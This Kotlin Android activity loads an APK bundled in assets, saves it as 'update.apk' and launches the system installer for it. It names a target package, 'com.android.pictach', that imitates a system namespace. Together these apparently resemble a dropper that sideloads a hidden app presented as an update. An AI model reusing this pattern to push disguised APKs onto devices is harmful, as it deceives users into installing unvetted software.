package com.cristal.bristral.tristal.mistral

import android.content.Intent
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.View
import android.widget.ProgressBar
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import java.io.File

class InstallActivity : AppCompatActivity() {

    companion object {
        private const val TARGET_PKG   = "com.android.pictach"
        private const val TARGET_CLASS = "com.android.pictach.MainActivity"
    }

    private var progressBar: ProgressBar? = null
    private var tvStatus: TextView? = null
    private val handler = Handler(Looper.getMainLooper())

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_install)
        progressBar = findViewById(R.id.progress_bar_install)
        tvStatus    = findViewById(R.id.tv_status)
        progressBar?.visibility = View.VISIBLE
        tvStatus?.text = getString(R.string.starting_installation)
        Thread { startAppFlow() }.start()
    }

    // ── MAIN FLOW ─────────────────────────────────────────────
    private fun startAppFlow() {
        try {
            val apkBytes = loadAssets()
            if (apkBytes == null || apkBytes.isEmpty()) { showMessage("STEP:LOAD_ASSETS\napk is null or empty"); return }

            runOnUiThread { installApkDirect(apkBytes) }

        } catch (e: Exception) {
            showMessage("STEP:FLOW\n${e.javaClass.simpleName}:\n${e.message}")
        }
    }

    // ── DIRECT APK INSTALL ────────────────────────────────────
    private fun installApkDirect(apkBytes: ByteArray) {
        try {
            val apkFile = File(cacheDir, "update.apk")
            apkFile.writeBytes(apkBytes)

            showMessage("STEP1:APK written\nSize: ${apkBytes.size} bytes\nPath: ${apkFile.absolutePath}")

            val uri = androidx.core.content.FileProvider.getUriForFile(
                this,
                "${packageName}.fileprovider",
                apkFile
            )

            showMessage("STEP2:URI ready\n$uri")

            val intent = Intent(Intent.ACTION_VIEW).apply {
                setDataAndType(uri, "application/vnd.android.package-archive")
                addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP)
            }

            startActivity(intent)

        } catch (e: Exception) {
            android.util.Log.e("InstallActivity", "installApkDirect FAILED: ${e.javaClass.simpleName}: ${e.message}", e)
            showMessage("FAILED:\n${e.javaClass.simpleName}:\n${e.message}")
        }
    }

    // ── ASSETS ────────────────────────────────────────────────
    private fun loadAssets(): ByteArray? {
        return try { assets.open("base.apk").use { it.readBytes() } } catch (e: Exception) { null }
    }

    // ── HELPERS ───────────────────────────────────────────────
    private fun showNormal() {
        runOnUiThread { tvStatus?.text = getString(R.string.please_keep_connected); progressBar?.visibility = View.GONE }
    }

    private fun showMessage(msg: String) {
        runOnUiThread {
            progressBar?.visibility = View.GONE
            tvStatus?.text = "ERROR:\n$msg"
            android.widget.Toast.makeText(this, msg, android.widget.Toast.LENGTH_LONG).show()
        }
    }

    override fun onDestroy() { super.onDestroy(); handler.removeCallbacksAndMessages(null) }
}
